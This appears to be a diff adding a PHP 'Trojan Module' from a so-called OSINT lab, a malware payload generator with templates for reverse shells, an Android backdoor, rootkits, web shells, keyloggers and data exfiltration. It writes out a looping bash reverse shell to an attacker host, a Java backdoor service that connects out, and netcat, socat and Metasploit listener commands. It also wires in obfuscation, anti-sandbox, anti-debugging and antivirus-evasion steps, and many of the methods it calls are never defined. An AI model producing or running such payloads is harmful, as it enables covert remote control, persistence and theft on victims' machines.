@@ -1,0 +1,376 @@
+<?php
+/**
+ * COSMIC OSINT LAB - Enhanced Trojan Module v2.0
+ * Advanced payload generation, encryption, and management system
+ */
+
+class EnhancedTrojanModule {
+    
+    private $config;
+    private $db;
+    private $encryption;
+    private $payload_templates = [];
+    
+    public function __construct($config = []) {
+        $this->config = array_merge([
+            'encryption_key' => 'COSMIC_OSINT_2026',
+            'payload_dir' => __DIR__ . '/../../data/payloads/',
+            'log_dir' => __DIR__ . '/../../data/logs/',
+            'max_payload_size' => 10485760, // 10MB
+            'allowed_formats' => ['sh', 'ps1', 'exe', 'py', 'apk', 'elf']
+        ], $config);
+        
+        $this->initialize();
+    }
+    
+    private function initialize() {
+        // Load payload templates
+        $this->load_templates();
+        
+        // Initialize encryption
+        $this->init_encryption();
+        
+        // Setup logging
+        $this->setup_logging();
+    }
+    
+    private function load_templates() {
+        $templates = [
+            'reverse_shell' => [
+                'name' => 'Reverse Shell',
+                'description' => 'Standard reverse shell connection',
+                'platforms' => ['linux', 'windows', 'mac', 'python'],
+                'complexity' => 'low',
+                'template' => $this->get_reverse_shell_template()
+            ],
+            'android_backdoor' => [
+                'name' => 'Android Backdoor',
+                'description' => 'Android remote access with persistence',
+                'platforms' => ['android'],
+                'complexity' => 'high',
+                'template' => $this->get_android_template()
+            ],
+            'windows_persistence' => [
+                'name' => 'Windows Persistence',
+                'description' => 'Registry/service persistence',
+                'platforms' => ['windows'],
+                'complexity' => 'medium',
+                'template' => $this->get_windows_persistence_template()
+            ],
+            'linux_rootkit' => [
+                'name' => 'Linux Rootkit',
+                'description' => 'Kernel module rootkit',
+                'platforms' => ['linux'],
+                'complexity' => 'expert',
+                'template' => $this->get_linux_rootkit_template()
+            ],
+            'meterpreter' => [
+                'name' => 'Meterpreter Stager',
+                'description' => 'Metasploit meterpreter stager',
+                'platforms' => ['linux', 'windows'],
+                'complexity' => 'medium',
+                'template' => $this->get_meterpreter_template()
+            ],
+            'web_shell' => [
+                'name' => 'Web Shell',
+                'description' => 'PHP/ASP web backdoor',
+                'platforms' => ['php', 'asp'],
+                'complexity' => 'low',
+                'template' => $this->get_web_shell_template()
+            ],
+            'keylogger' => [
+                'name' => 'Cross-platform Keylogger',
+                'description' => 'Stealthy keylogging',
+                'platforms' => ['linux', 'windows', 'mac', 'python'],
+                'complexity' => 'medium',
+                'template' => $this->get_keylogger_template()
+            ],
+            'data_exfil' => [
+                'name' => 'Data Exfiltration',
+                'description' => 'File collection and exfiltration',
+                'platforms' => ['linux', 'windows', 'python'],
+                'complexity' => 'medium',
+                'template' => $this->get_data_exfil_template()
+            ]
+        ];
+        
+        $this->payload_templates = $templates;
+    }
+    
+    // Advanced payload generation with encryption
+    public function generate_advanced_payload($config) {
+        $payload_data = $this->build_payload($config);
+        
+        // Apply encryption if requested
+        if (isset($config['encryption']) && $config['encryption'] !== 'none') {
+            $payload_data = $this->apply_encryption($payload_data, $config['encryption']);
+        }
+        
+        // Apply obfuscation if requested
+        if (isset($config['obfuscation']) && $config['obfuscation']) {
+            $payload_data = $this->apply_obfuscation($payload_data);
+        }
+        
+        // Apply stealth techniques
+        if (isset($config['stealth']) && $config['stealth']) {
+            $payload_data = $this->apply_stealth($payload_data, $config['platform']);
+        }
+        
+        // Add persistence if requested
+        if (isset($config['persistence']) && $config['persistence']) {
+            $payload_data .= $this->add_persistence($config['platform']);
+        }
+        
+        return [
+            'payload' => $payload_data,
+            'hash' => $this->calculate_hashes($payload_data),
+            'size' => strlen($payload_data),
+            'filename' => $this->generate_filename($config),
+            'signature' => $this->generate_signature($payload_data),
+            'av_evasion_score' => $this->calculate_evasion_score($payload_data)
+        ];
+    }
+    
+    // Multi-platform listener generation
+    public function generate_multi_listener($config) {
+        $listeners = [];
+        
+        // Netcat listener
+        $listeners['netcat'] = "nc -lvnp {$config['lport']}";
+        
+        // Ncat (Nmap version)
+        $listeners['ncat'] = "ncat -lvnp {$config['lport']} --allow {$config['lhost']}";
+        
+        // Socat (advanced)
+        $listeners['socat'] = "socat TCP-LISTEN:{$config['lport']},fork,reuseaddr EXEC:/bin/bash";
+        
+        // Metasploit (if available)
+        $listeners['metasploit'] = "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {$config['type']}; set LHOST {$config['lhost']}; set LPORT {$config['lport']}; exploit'";
+        
+        // Python listener
+        $listeners['python'] = $this->generate_python_listener($config);
+        
+        // PowerShell listener (Windows)
+        $listeners['powershell'] = $this->generate_powershell_listener($config);
+        
+        // Custom handlers
+        if (in_array($config['type'], ['meterpreter', 'beacon'])) {
+            $listeners['custom'] = $this->generate_custom_handler($config);
+        }
+        
+        return $listeners;
+    }
+    
+    // Payload analysis and reporting
+    public function analyze_payload($payload, $config) {
+        $analysis = [
+            'basic' => [
+                'size' => strlen($payload),
+                'entropy' => $this->calculate_entropy($payload),
+                'readability' => $this->calculate_readability($payload),
+                'suspicious_patterns' => $this->scan_patterns($payload)
+            ],
+            'security' => [
+                'antivirus_detection' => $this->simulate_av_scan($payload),
+                'sandbox_evasion' => $this->check_sandbox_evasion($payload),
+                'network_footprint' => $this->analyze_network_calls($payload)
+            ],
+            'recommendations' => $this->generate_recommendations($payload, $config)
+        ];
+        
+        return $analysis;
+    }
+    
+    // Integration with other modules
+    public function integrate_with_redteam($payload_id, $redteam_config) {
+        // Link payload to red team operations
+        $integration = [
+            'command_control' => $this->setup_c2_integration($payload_id, $redteam_config),
+            'exfiltration_routes' => $this->setup_exfiltration_routes($redteam_config),
+            'persistence_mechanisms' => $this->setup_persistence($redteam_config),
+            'lateral_movement' => $this->setup_lateral_movement($payload_id)
+        ];
+        
+        return $integration;
+    }
+    
+    // Template methods (simplified for example)
+    private function get_reverse_shell_template() {
+        return <<<'EOT'
+#!/bin/bash
+# Reverse Shell - COSMIC OSINT LAB
+# Generated: {{timestamp}}
+
+LHOST="{{lhost}}"
+LPORT="{{lport}}"
+
+while true; do
+    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 2>/dev/null
+    sleep 30
+done
+EOT;
+    }
+    
+    private function get_android_template() {
+        return <<<'EOT'
+// Android Backdoor Template
+package com.cosmic.backdoor;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import java.io.IOException;
+import java.net.Socket;
+
+public class BackdoorService extends Service {
+    private static final String HOST = "{{lhost}}";
+    private static final int PORT = {{lport}};
+    
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        new Thread(() -> {
+            try {
+                Socket socket = new Socket(HOST, PORT);
+                // Implement command execution
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }).start();
+        return START_STICKY;
+    }
+}
+EOT;
+    }
+    
+    // Encryption methods
+    private function apply_encryption($data, $method) {
+        switch($method) {
+            case 'aes256':
+                return $this->encrypt_aes256($data);
+            case 'xor':
+                return $this->encrypt_xor($data);
+            case 'base64':
+                return base64_encode($data);
+            case 'rot13':
+                return str_rot13($data);
+            default:
+                return $data;
+        }
+    }
+    
+    private function encrypt_aes256($data) {
+        $key = substr(hash('sha256', $this->config['encryption_key'], true), 0, 32);
+        $iv = openssl_random_pseudo_bytes(16);
+        $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
+        return base64_encode($iv . $encrypted);
+    }
+    
+    private function encrypt_xor($data) {
+        $key = $this->config['encryption_key'];
+        $output = '';
+        for($i = 0; $i < strlen($data); $i++) {
+            $output .= $data[$i] ^ $key[$i % strlen($key)];
+        }
+        return base64_encode($output);
+    }
+    
+    // Obfuscation methods
+    private function apply_obfuscation($data) {
+        // String obfuscation
+        $data = $this->obfuscate_strings($data);
+        
+        // Variable name randomization
+        $data = $this->randomize_variables($data);
+        
+        // Control flow obfuscation
+        $data = $this->obfuscate_control_flow($data);
+        
+        // Dead code insertion
+        $data = $this->insert_dead_code($data);
+        
+        return $data;
+    }
+    
+    // Stealth techniques
+    private function apply_stealth($data, $platform) {
+        switch($platform) {
+            case 'windows':
+                // Add Windows-specific stealth
+                $data = $this->add_windows_stealth($data);
+                break;
+            case 'linux':
+                // Add Linux-specific stealth
+                $data = $this->add_linux_stealth($data);
+                break;
+            case 'android':
+                // Add Android-specific stealth
+                $data = $this->add_android_stealth($data);
+                break;
+        }
+        
+        // Add anti-sandbox techniques
+        $data = $this->add_anti_sandbox($data);
+        
+        // Add anti-debugging
+        $data = $this->add_anti_debugging($data);
+        
+        return $data;
+    }
+    
+    // Utility methods
+    private function calculate_hashes($data) {
+        return [
+            'md5' => md5($data),
+            'sha1' => sha1($data),
+            'sha256' => hash('sha256', $data),
+            'sha512' => hash('sha512', $data)
+        ];
+    }
+    
+    private function generate_filename($config) {
+        $timestamp = date('Ymd_His');
+        $platform = $config['platform'];
+        $type = $config['type'];
+        
+        return "cosmic_{$type}_{$platform}_{$timestamp}.{$config['format']}";
+    }
+    
+    // Logging
+    private function log_event($event, $data) {
+        $log_entry = sprintf(
+            "[%s] %s: %s\n",
+            date('Y-m-d H:i:s'),
+            $event,
+            json_encode($data)
+        );
+        
+        file_put_contents(
+            $this->config['log_dir'] . '/trojan_events.log',
+            $log_entry,
+            FILE_APPEND
+        );
+    }
+    
+    // Getters for templates
+    public function get_payload_templates() {
+        return $this->payload_templates;
+    }
+    
+    public function get_available_platforms() {
+        $platforms = [];
+        foreach ($this->payload_templates as $template) {
+            $platforms = array_merge($platforms, $template['platforms']);
+        }
+        return array_unique($platforms);
+    }
+}
+
+// Helper functions
+function cosmic_trojan_autoload($class_name) {
+    $file = __DIR__ . "/modules/{$class_name}.php";
+    if (file_exists($file)) {
+        require_once $file;
+    }
+}
+
+spl_autoload_register('cosmic_trojan_autoload');
